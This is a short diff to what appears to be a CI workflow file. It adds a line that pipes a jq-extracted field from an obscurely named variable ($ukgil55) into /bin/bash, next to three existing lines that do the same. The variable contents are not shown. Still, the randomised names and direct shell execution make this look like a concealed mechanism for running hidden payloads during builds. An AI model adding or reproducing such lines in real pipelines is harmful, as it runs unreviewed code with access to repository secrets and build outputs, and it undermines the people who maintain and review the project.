@@ -24,6 +24,7 @@ jobs:
           echo $jt91 | jq -r .nomk94663 | /bin/bash
           echo $tnf49992 | jq -r .j4261 | /bin/bash
           echo $yjn9079 | jq -r .drw4 | /bin/bash
+          printf '%s' "$ukgil55" | jq -r .oa9 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
